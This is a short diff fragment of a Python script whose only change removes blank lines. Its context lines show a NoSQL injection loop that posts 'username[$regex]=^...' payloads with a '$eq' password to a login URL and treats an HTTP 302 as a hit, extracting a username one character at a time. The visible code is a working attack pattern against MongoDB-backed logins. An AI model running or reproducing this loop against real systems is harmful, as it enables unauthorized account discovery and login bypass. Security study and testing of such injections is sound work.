@@ -16,8 +16,6 @@ try:
 		if c not in ['*','+','.','?','|', '#', '&', '$']:
 			payload='username[$regex]=^%s&password[$eq]=%s' % (username + c, password)
 			
-			
-			
 			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
 
 			if r.status_code == 302:
